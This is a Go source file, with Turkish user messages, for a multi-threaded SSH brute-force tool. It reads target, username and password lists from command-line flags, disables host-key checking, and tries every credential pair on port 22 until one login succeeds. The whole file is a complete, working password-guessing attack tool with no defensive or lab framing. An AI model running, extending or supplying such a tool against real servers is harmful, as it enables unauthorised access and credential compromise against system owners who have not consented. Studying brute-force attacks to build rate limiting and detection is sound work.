package main

import (
	"bufio"
	"fmt"
	"os"
	"strconv"
	"sync"
	"time"

	"golang.org/x/crypto/ssh"
)

func main() {
	config, err := parseArgs()
	if err != nil {
		fmt.Println("Hata:", err)
		os.Exit(1)
	}

	fmt.Printf("Hedef: %s\n", config.Host)
	fmt.Printf("Kullanıcılar: %v\n", config.Usernames)
	fmt.Printf("Şifreler: %v\n", config.Passwords)
	fmt.Printf("Worker Sayısı: %d\n", config.Workers)

	bruteForce(config, config.Workers)
}

type Config struct {
	Host      string
	Usernames []string
	Passwords []string
	Workers   int
}

func readLines(filename string) ([]string, error) {
	var lines []string

	file, err := os.Open(filename)
	if err != nil {
		return nil, fmt.Errorf("dosya açılamadı: %s", filename)
	}
	defer file.Close()

	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		lines = append(lines, scanner.Text())
	}

	if err := scanner.Err(); err != nil {
		return nil, fmt.Errorf("dosya okuma hatası: %s", filename)
	}

	return lines, nil
}

func parseArgs() (*Config, error) {
	args := os.Args[1:]
	config := &Config{Workers: 10}

	var userFile, passFile string

	for i := 0; i < len(args); i++ {
		switch args[i] {
		case "-h":
			if i+1 < len(args) {
				config.Host = args[i+1]
				i++
			} else {
				return nil, fmt.Errorf("hata: -h parametresi için bir IP veya hostname girilmelidir")
			}
		case "-u":
			if i+1 < len(args) {
				config.Usernames = append(config.Usernames, args[i+1])
				i++
			} else {
				return nil, fmt.Errorf("hata: -u parametresi için bir kullanıcı adı girilmelidir")
			}
		case "-U":
			if i+1 < len(args) {
				userFile = args[i+1]
				i++
			} else {
				return nil, fmt.Errorf("hata: -U parametresi için bir kullanıcı listesi dosyası girilmelidir")
			}
		case "-p":
			if i+1 < len(args) {
				config.Passwords = append(config.Passwords, args[i+1])
				i++
			} else {
				return nil, fmt.Errorf("hata: -p parametresi için bir şifre girilmelidir")
			}
		case "-P":
			if i+1 < len(args) {
				passFile = args[i+1]
				i++
			} else {
				return nil, fmt.Errorf("hata: -P parametresi için bir şifre listesi dosyası girilmelidir")
			}
		case "-workers":
			if i+1 < len(args) {
				workers, err := strconv.Atoi(args[i+1])
				if err != nil || workers <= 0 {
					return nil, fmt.Errorf("hata: -workers parametresi geçerli bir pozitif sayı olmalıdır")
				}
				config.Workers = workers
				i++
			} else {
				return nil, fmt.Errorf("hata: -workers parametresi için sayı girilmelidir")
			}
		default:
			return nil, fmt.Errorf("bilinmeyen parametre: %s", args[i])
		}
	}

	if config.Host == "" {
		return nil, fmt.Errorf("hata: -h parametresi zorunludur")
	}
	if len(config.Usernames) == 0 && userFile == "" {
		return nil, fmt.Errorf("hata: Kullanıcı adı için -u veya -U parametresinden biri gereklidir")
	}
	if len(config.Passwords) == 0 && passFile == "" {
		return nil, fmt.Errorf("hata: Şifre için -p veya -P parametresinden biri gereklidir")
	}

	if userFile != "" {
		users, err := readLines(userFile)
		if err != nil {
			return nil, err
		}
		config.Usernames = append(config.Usernames, users...)
	}

	if passFile != "" {
		passwords, err := readLines(passFile)
		if err != nil {
			return nil, err
		}
		config.Passwords = append(config.Passwords, passwords...)
	}

	return config, nil
}

type SSHAttempt struct {
	User string
	Pass string
}

func trySSH(host, user, pass string) bool {
	config := &ssh.ClientConfig{
		User: user,
		Auth: []ssh.AuthMethod{
			ssh.Password(pass),
		},
		HostKeyCallback: ssh.InsecureIgnoreHostKey(),
		Timeout:         5 * time.Second,
	}

	address := fmt.Sprintf("%s:22", host)
	conn, err := ssh.Dial("tcp", address, config)
	if err != nil {
		fmt.Printf("[-] Başarısız: %s / %s (%s)\n", user, pass, err)
		return false
	}
	defer conn.Close()

	fmt.Printf("[+] Başarılı Giriş: %s / %s\n", user, pass)
	return true
}

func worker(host string, jobs <-chan SSHAttempt, results chan<- bool, wg *sync.WaitGroup) {
	defer wg.Done()
	for attempt := range jobs {
		if trySSH(host, attempt.User, attempt.Pass) {
			results <- true
			return
		}
	}
}

func bruteForce(config *Config, numWorkers int) {
	jobs := make(chan SSHAttempt, len(config.Usernames)*len(config.Passwords))
	results := make(chan bool)
	var wg sync.WaitGroup

	for i := 0; i < numWorkers; i++ {
		wg.Add(1)
		go worker(config.Host, jobs, results, &wg)
	}

	go func() {
		for _, user := range config.Usernames {
			for _, pass := range config.Passwords {
				jobs <- SSHAttempt{User: user, Pass: pass}
			}
		}
		close(jobs)
	}()

	go func() {
		wg.Wait()
		close(results)
	}()

	for res := range results {
		if res {
			fmt.Println("[+] Geçerli kimlik bilgileri bulundu, çıkılıyor...")
			return
		}
	}

	fmt.Println("[-] Hiçbir giriş başarılı olmadı.")
}
